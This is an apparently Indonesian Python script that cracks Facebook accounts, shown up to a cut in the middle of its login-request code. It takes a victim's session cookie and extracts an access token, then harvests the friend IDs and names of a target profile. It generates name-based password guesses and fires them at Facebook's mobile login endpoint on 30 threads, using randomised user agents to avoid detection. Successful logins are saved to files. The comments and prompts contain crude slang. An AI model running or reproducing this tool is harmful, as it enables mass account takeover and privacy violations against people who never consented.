# SC FREE JANGAN DIPERJUAL BELIKAN
# MAU OPREK SILAHKAN 
# NAMA : AT_GANTENG IYA KAN :)
# MAKASIH
#<----------[ MODULE ]---------->#
import requests,json,os,sys,random,datetime,time,re,platform,bs4,rich,stdiomask
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.console import Console as sol
from rich.markdown import Markdown as mark
#<----------[ MEMEK ]---------->#
id,id1,uid,uid1 = [],[],[],[]
kentod,kentid = [],[]
loop,ok,cp = 0,0,0
pwkon, pwnya = [],[]
tokenmek = []
at,at2 = [],[]
ses = requests.Session()
rr = random.randint
rc = random.choice
#<----------[ USER AGENT ]---------->#
def AteUgen():
	iphone1 = rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"])
	iphone2 = rc(["8B112","19E258","15E148","15D100","8A293","8B116","8B117","8C148","8C148","17H35","15E148","8B112","21A360","21B77","12A365","12A405","12B410","12B410","12B435","12B440","12B466","11A465","10A406","11A501","11B554a","11D167"])
	iphone3 = rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"])
	model = rc(["bhb-IN","mag-IN","en-us","nan-TW","ro-RO","de-de","yue-HK","en-gb","gl-ES"])
	NO = rc([f'{str(rr(1,10))}.{str(rr(0,4))}.{str(rr(0,4))}',f'{str(rr(1,25))}.0',f'{str(rr(1,25))}'])
	a = rc(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID'])
	b = rc(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata'])
	ran = rc(['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H','R16NW'])
	SM = rc(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B","A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U","G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"])
	ua = f'Mozilla/5.0 (iPhone; U; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) AppleWebKit/{iphone1} (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{iphone2} Safari/{iphone3}'
	ua0 = f'Mozilla/5.0 (iPhone; CPU OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) CriOS/{str(rr(10,121))}.0.{str(rr(1000,10000))}.{str(rr(10,399))}Mobile/{iphone2} Safari/{iphone3}'
	ua1 = f'Dalvik/2.1.0 (Linux; U; Android {NO}; SM-{SM} Build/{ran}) [FBAN/MessengerLite;FBAV/{str(rr(37,325))}.0.0.{str(rr(1,20))}.{str(rr(40,150))};FBPN/com.facebook.mlite;FBLC/{a};FBBV/{str(rr(11111111,99999999))};FBCR/{b};FBMF/samsung;FBBD/samsung;FBDV/SM-{SM};FBSV/{NO};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/density={str(rr(0,25))}.{str(rr(0,25))},width={str(rr(100,1000))},height={str(rr(0,25))}.{str(rr(0,25))};FBCR/{b};FBLC/id_ID;FB_FW/1;]'
	return rc([ua,ua0,ua1])
#<----------[ WARNA ]---------->#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
mahal = random.choice([P,M,K,H,B,U])
#<----------[ BULAN ]---------->#
rb = {'1':'JANUARI','2':'FEBRUARI','3':'MARET','4':'APRIL','5':'MEI','6':'JUNI','7':'JULI','8':'AGUSTUS','9':'SEPTEMBER','10':'OKTOBER','11':'NOVEMBER','12':'DESEMBER'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
oke = 'AT-LIVE-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cpe = 'AT-CHEK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
#<----------[ UCAPAN MANIS ]---------->#
hour = datetime.datetime.now().hour
if 19 <= hour < 4:
  at2 = f"SELAMAT MALAM"
elif 4 <= hour < 12:
  at2 = f"SELAMAT PAGI"
elif 12 <= hour < 15:
  at2 = "SELAMAT SIANG"
elif 15 <= hour < 18:
  at2 = f"SELAMAT SORE"
elif 18 <= hour < 19:
  at2 = f"SELAMAT MALAM"
else:
  at2 = f"SELAMAT MALAM"
#<----------[ ANIMASI ]---------->#
def at(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.05)
def at(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	menu(id)
#<----------[ BANNER ]---------->#
def AteLOGO():
	os.system('clear')
	print(f'''⠀⠀⠀⠀⠀⠀⠀⣠⣠⣶⣿⣷⣿⣿⣿⣷⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣾⣿⢿⣻⡽⣞⣳⡽⠚⠉⠉⠙⠛⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⢻⣟⣧⢿⣻⢿⠀⠀⠀⠀⠀⠀⠀⠻⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣿⡿⠞⠛⠚⠫⣟⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⡟⠀⠀⠀⠀⠀⠈⢻⡽⣆⠀⠀⣴⣷⡄⠀⠀⠀⠘⣿⡆⠀⠀⣀⣠⣤⡄
⠀⠀⣿⣿⠁⠀⠀⠀⠀⠀⠀⠈⣿⠿⢷⡀⠘⠛⠃⠀⠠⠀⠀⣿⣅⣴⡶⠟⠋⢹⣿
⠀⠀⢻⣿⡀⠀⠀⠀⢾⣿⡆⠀⢿⣴⣴⡇⠀⠀⠀⠀⠀⠀⢠⡟⠋⠁⠀⠀⠀⢸⣿
⠀⠀⠈⢿⣇⠀⠀⠀⠈⠉⠥⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⣾⡏
⠀⠀⠀⠈⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠸⠁⠀⠀⠀⠀⠀⣼⡟⠀
⠀⠀⠀⠀⠀⣹⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠀⠐⢧⡀⠀⢀⣾⠟⠀⠀
⠀⠀⢀⣰⣾⠟⠉⠀⠀⠉⠉⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣶⡟⠋⠀⠀⠀
⣠⣶⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⣿⡆⠀⠀⠀⠀
⢻⣧⣄⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠉⠛⠿⣷⣶⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣾⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣷⣦⡀⠀⢀⣀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣷⠀      SECE SIMPEL
⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⠿⠟⠁   VERSION UPDATE : {mahal}2024
{P}''')
#<--------------[ DEF-LOGIN ]-------------->#
def login_at():
	try:
		token = open('.plntok.txt','r').read()
		cok = open('.plncok.txt','r').read()
		tokenmek.append(token)
		try:
			attt1 = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenmek[0], cookies={'cookie':cok})
			attt2 = json.loads(attt1.text)['name']
			attt3 = json.loads(attt1.text)['id']
			menu(attt3)
		except KeyError:
			login_at1()
		except requests.exceptions.ConnectionError:
			li = f' {B}══➤{P} TIDAK ADA KONEKSI INTERNET, CEK INTERNET ANDA DAN JALANIN ULANG SCNYA'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_at1()
#<--------------[ DEF-LOGIN-LAGI ]-------------->#
def login_at1():
	try:
		os.system('clear')
		AteLOGO()
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
		cok_mek = input(f' {M}[{K}${M}]{P}. MASUKAN PERAWAN :{M} ')
		conver = gatot(cok_mek)
		print(f' {M}[{K}${M}]{P}. TOKEN : {M}{conver} ')
		at(f' {B}══➤{P} LOGIN SUKSES MEK ')
		tokennew = open(".plntok.txt", "w").write(conver)
		cokienew = open(".plncok.txt", "w").write(cok_mek)
		
	except Exception as e:
		os.system("rm -f .plntok.txt")
		os.system("rm -f .plntok.txt")
		at(f' {B}══➤{P} LOGIN GAGAL GANTI TUMBAL LU MEK !!')
		time.sleep(5)
		print(e)
		login_at()

def gatot(cok):
		at_gans = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
		at_gans1 = re.search('window\.location\.replace\("(.*?)"\)',str(at_gans)).group(1).replace('\\','')
		at_gans2 = ses.get(at_gans1,cookies={'cookie':cok},allow_redirects=True).text
		at_gans3  = re.search('accessToken="(.*?)"',str(at_gans2)).group(1)
		return(at_gans3)
#<----------[ DEF-MENU ]---------->#
def menu(id):
	try:
		token = open('.plntok.txt','r').read()
		cok = open('.plncok.txt','r').read()
	except IOError:
		at(f' {B}══➤{P} TUMBALU MOKAD MEK ')
		waktu(2)
		login_at()
	os.system('clear')
	AteLOGO()
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' ══➤ STATUS : {mahal}FREE{P} ')
	print(f' ══➤ NAMA   : {mahal}AT_GANTENG{P} ')
	print(f' ══➤ {mahal}{at2} KANG COLI {P}:) ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' ══➤ {mahal}JANGAN TERLALU BERHARAP YG TIDAK PASTI {P}:( ')
	print(f' ══➤ {mahal}SEMOGA HARI² MU MENYENANGKAN SAYANG {P}:v ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' {M}[{H}1{M}]{P}. CRACK PUBLIK		{M}[{H}0{M}]{P}. GANTI PERAWAN ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	AT = input(f' {M}[{K}${M}]{P}. PILIH COK 1/0 : ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	if AT in ['1','1']:
		idt = input(f' {M}[{K}${M}]{P}. MASUKAN ID PUBLIK : ')
		dump(idt,"",{"cookie":cok},token)
		print('')
		Ate_setting()
	elif AT in ['exit','0','logout']:
		hapus_prawan = os.system('rm -rf .plntok.txt && rm -f .plncok.txt')
		at(f' {B}══➤{P} SUKSES JEBOL PERAWAN')
		time.sleep(5)
		login_at()
	else:
		at(f" {B}══➤{P} MASUKAN HANYA ANGKA COK")
		waktu(2)
		back()
#<----------[ DEF-PUBLIK ]---------->#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r {M}[{K}${M}]{P}. TOTAL ID TERKUMPUL : {len(id)}{P} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#<----------[ DEF-THN-RANDOM ]---------->#
def Ate_setting():
	for at_ganteng in id:
			att = random.randint(0,len(id1))
			id1.insert(att,at_ganteng)
	At_metod()
#<----------[ DEF-METHOD ]---------->#
def At_metod():
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f' {M}[{H}1{M}]{P}. VALID			{M}[{H}2{M}]{P}. ASYNC ')
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	ganteng_ = input(f' {M}[{K}${M}]{P}. PILIH COK 1/2 : ')
	if ganteng_ in ['01','1']:
		kentod.append('valid')
	elif ganteng_ in ['02','2']:
		kentod.append('async')
	else:
		at(f" {B}══➤{P} MASUKAN HANYA ANGKA COK")
		waktu(2)
		At_metod()
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	passs = input(f' {M}[{K}${M}]{P}. TAMBAHKAN PW MANUAL Y/t : ')
	if passs in ['y','Y']:
		pwkon.append('ya')
		paskon = input(f' {M}[{K}${M}]{P}. MASUKAN PW MANUAL :  ')
		paslon = paskon.split(',')
		for _pw_ in paslon:
			pwnya.append(_pw_)
	else:
		pwkon.append('tidak')
		Te_pass()
#<----------[ DEF-WONDERLIST ]---------->#
def Te_pass():
	global prog,des,AteGanteng,GantengPoll
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	print(f""" {M}[{K}${M}]{P}. HASIL LIVE DI = {H}{oke}{P}\n {M}[{K}${M}]{P}. HASIL CHEK DI = {K}{cpe}{P}\n {M}[{K}${M}]{P}. MAINKAN MEMEK PERAWAN SETIAP 300 COLMEKAN """)
	print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
	AteGanteng = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	GantengPoll = AteGanteng.add_task('',total=len(id))
	with AteGanteng:
		with tred(max_workers=30) as plongo:
			for mustika in id1:
				uid,nama = mustika.split('|')[0],mustika.split('|')[1].lower()
				depan = nama.split(' ')[0]
				pasat = []
				if len(nama)<6:
					if len(depan)<3:
						pass
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'03')
						pasat.append(depan+'26')
						pasat.append(depan+'55')
						pasat.append(depan+'29')
				else:
					if len(depan)<3:
						pasat.append(nama)
					else:
						pasat.append(nama)
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'03')
						pasat.append(depan+'26')
						pasat.append(depan+'55')
						pasat.append(depan+'29')
				if 'at' in pwkon:
					for pwde in pwnya:
						pasat.append(pwde)
				else:pass
				if 'valid' in kentod:
					plongo.submit(validate,uid,pasat)
				elif 'async' in kentod:
					plongo.submit(asyncc,uid,pasat)
				else:
					plongo.submit(validate,uid,pasat)
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
		print(f" {M}[{K}${M}]{P}. SUKSES CRACK {B}{len(id1)}{P} ID,DENGAN JUMPLAH HASIL\n {M}[{K}${M}]{P}. AT-LIVE = {H}{ok} \n {M}[{K}${M}]{P}. AT-CHEK = {K}{cp}{P}")
		print(f'❫════════════════════ ≪ °❈° ≫ ════════════════════❪')
#<----------[ DEF-VALIDATE ]---------->#
def validate(uid,pasat):
	global loop,ok,cp
	AteGanteng.update(GantengPoll,description=f' [TEGAR] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	AteGanteng.advance(GantengPoll)
	ua = AteUgen()
	ses = requests.Session()
	for pw in pasat:
		try:
			p = ses.get('https://m.prod.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa = ({
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid":uid,
			"next": "https://m.prod.facebook.com/v5.0/dialog/oauth?app_id=285562428300787&cbt=1709452496918&channel_url=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=fe2e12d59af8fed29&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&client_id=285562428300787&display/touch&domain=www.jamtangan.com-e2e-fallback_redirect_uri=https://www.jamtangan.com&login/locale&en_US/logger_id=f48b37a2e1119e20c&origin=2&redirect_uri=https://staticxx.facebook.com-x-connect&xd_arbiter/version=4623&cb=ff857ee30a26b211a&domain=www.jamtangan.com&is_canvas/false&origin=https://www.jamtangan.com-f8a7fd5c976607552&relation/opener&frame=fb4ebd097bc939579&response_type/token&signed_request/graph_domain&return_scopes/true&scope/email&public_profile/sdk/joey&version=v5.0&ret/login&fbapp_pres=0&tp/unspecified",
			"flow":"login_no_pin",
			"pass":pw,
			})
			koki_kon = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			heade=({
			'Host': 'm.prod.facebook.com',
			'content-length': f"{len(str(dataa))}",
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,10))}',
			'viewport-width': f'{str(rr(99,999))}',
			'sec-ch-ua': f'"Not_A Brand";v="{str(rr(1,99))}", "Chromium";v="{str(rr(10,120))}"',
			'sec-ch-ua-mobile': f'?{str(rr(0,1))}',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(1,25))}.0.0"',
			'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(1,99))}.0.0.0", "Chromium";v="{str(rr(10,120))}.0.{str(rr(1000,10000))}.{str(rr(10,270))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.prod.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
